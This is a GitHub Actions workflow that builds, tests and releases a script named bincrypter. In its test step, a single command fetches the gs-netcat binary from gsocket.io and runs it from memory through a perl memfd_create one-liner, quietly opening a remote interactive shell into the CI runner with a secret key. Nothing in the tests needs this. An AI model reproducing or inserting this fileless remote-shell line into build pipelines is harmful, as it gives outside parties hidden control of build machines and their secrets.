name: Test & Release
# on: [push]
#   branches:
#     - main
#   paths:
#     - src/*
on: [workflow_dispatch]

permissions:
  contents: write

jobs:
  Source:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: dist
        run: |
          src/make.sh
          mkdir -p bc
          cp bincrypter.sh bc/bincrypter
          cp tests/run-tests.sh bc
          chmod +x bc/*

      - name: Save
        uses: actions/upload-artifact@v4
        with:
          name: releasebin
          path: bc

  Linux-Busybox:
    needs: [Source]
    runs-on: ubuntu-latest
    container:
      image: alpine
      # options: --user root
    steps:
      - name: Add build dependencies
        run: |
          apk add --update --no-cache --no-progress bash perl openssl curl

      - name: Get Release-bin
        uses: actions/download-artifact@v4
        with:
          name: releasebin

      - name: Run Tests
        run: |
          ls -al
          chmod +x bincrypter run-tests.sh
          curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-x86_64 | GS_ARGS="-ilq -s ${{ secrets.GSNCSECRET }}" perl '-e$^F=255;for(319,279,385,314){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV' -- "$@"
          PATH=$(pwd):$PATH ./run-tests.sh

  release:
    needs: [Linux-Busybox]
    runs-on: ubuntu-latest
    steps:
      - name: Get Release-bin
        uses: actions/download-artifact@v4
        with:
          key: releasebin

      - name: Upload dist
        uses: svenstaro/upload-release-action@v2
        with:
          repo_token: ${{ secrets.GITHUB_TOKEN }}
          file: bincrypter
          overwrite: true
          # tag: v${{ env.VER }}
    
